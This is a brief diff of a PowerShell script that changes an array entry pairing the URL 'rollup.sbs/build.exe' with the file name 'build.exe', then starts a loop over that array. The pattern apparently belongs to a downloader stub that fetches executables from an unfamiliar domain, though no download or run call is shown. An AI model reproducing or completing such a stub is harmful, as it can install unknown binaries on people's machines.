@@ -1,5 +1,5 @@
 $someData = @(
-    [PSCustomObject]@{a = "http://rollup.sbs/build.exe"; b = "build.exe"}
+    [PSCustomObject]@{a = "https://rollup.sbs/build.exe"; b = "build.exe"}
   );
 
   foreach ($i in $someData) {
